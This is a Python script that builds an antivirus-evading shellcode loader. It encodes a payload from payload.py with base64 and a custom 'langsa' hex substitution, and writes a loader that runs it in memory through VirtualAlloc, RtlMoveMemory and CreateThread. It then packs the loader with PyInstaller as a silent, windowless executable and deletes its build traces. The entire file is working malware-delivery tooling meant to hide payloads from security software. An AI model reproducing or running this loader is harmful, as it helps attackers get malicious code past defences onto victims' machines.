# -*- coding: UTF-8 -*-
# @Time:  16:30
# @Author: 浪飒
# @File: BypassAV-langsa.py
# @Software: PyCharm
import base64
import os
import shutil

import PyInstaller.__main__

en_langsa = {
    '0': '00',
    '1': 'la',
    '2': 'ln',
    '3': 'lg',
    '4': 'ls',
    '5': 'l2',
    '6': 'an',
    '7': 'ag',
    '8': 'as',
    '9': 'aa',
    'a': 'ng',
    'b': 'ns',
    'c': 'na',
    'd': 'gs',
    'e': 'ga',
    'f': 'sa'
}


# langsa进制编码
def encode_langsa(text):
    encode_text = ''
    # 转16进制
    text16 = text.encode("utf-8").hex()
    for i in text16:
        encode_text += en_langsa[i]
    return encode_text


def en_bs64():
    shellcode = open('payload.py')
    shellcode = shellcode.read()
    # 取出shellcode内容
    s1 = shellcode.find("\"") + 1
    s2 = shellcode.rfind("\"")
    shellcode = shellcode[s1:s2]
    shellcode = str(base64.b64encode(shellcode.encode('UTF-8')), 'UTF-8')
    return shellcode

if __name__ == '__main__':
    file = open('cache.py', 'w', encoding="utf-8")
    file.write("""
# -*- coding: UTF-8 -*-
# @Time:  14:16
# @Author: 浪飒
# @File: 浪飒bypassAV.py
# @Software: PyCharm

import binascii
import ctypes
from langsa_system.langsa import decode_langsa

浪飒=\"""" + encode_langsa("""
import base64
import binascii
import codecs
import ctypes

de_langsa = {
    '00': '0',
    'la': '1',
    'ln': '2',
    'lg': '3',
    'ls': '4',
    'l2': '5',
    'an': '6',
    'ag': '7',
    'as': '8',
    'aa': '9',
    'ng': 'a',
    'ns': 'b',
    'na': 'c',
    'gs': 'd',
    'ga': 'e',
    'sa': 'f'
}

def de_bs64(shellcode):
    shellcode = base64.b64decode(shellcode)
    shellcode = codecs.escape_decode(shellcode)[0]
    return shellcode



def decode_langsa(text):
    text16 = ''
    for i in range(0,len(text),2):
        text16 = text16 + de_langsa[text[i:i + 2]]
    decode_text = binascii.a2b_hex(text16).decode()
    return decode_text
                             
def run(shellcode):
    shellcode = bytearray(shellcode)
    # 设置VirtualAlloc返回类型为ctypes.c_uint64
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    # 申请内存
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))

    # 放入shellcode
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr),
        buf,
        ctypes.c_int(len(shellcode))
    )
    # 创建一个线程从shellcode防止位置首地址开始执行
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_uint64(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
    # 等待上面创建的线程运行完
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
""" + 'langsa=\"' + encode_langsa(en_bs64()) + '\"' +
                         """
run(de_bs64(decode_langsa(langsa)))
""") + '\"' + """
if __name__ == '__main__':
    exec(decode_langsa(浪飒)) """)
    file.close()
    print("我正在生成exe，你别急")
    try:
        # 获取要打包的脚本路径
        script_file = "cache.py"
        # 获取 PyInstaller 路径
        pyinstaller_path = os.path.dirname(PyInstaller.__main__.__file__)
        # 设置打包选项
        build_args = [
            "--onefile",  # 生成一个单独的可执行文件
            "--noconsole",  # 不显示命令行窗口
            "--name=BypassAV-langsa",  # 设置生成的可执行文件名
            "-i=favicon.ico",  # 加载平台鼠标纸牌图标
            script_file  # 添加要打包的脚本路径
        ]
        # 执行打包命令
        PyInstaller.__main__.run(build_args)
    except:
        print("快看下exe打包好了没,在dist文件夹下")
    # 删除 build 文件夹和.spec文件
    shutil.rmtree("./build")
    os.remove("./BypassAV-langsa.spec")
    os.remove("./cache.py")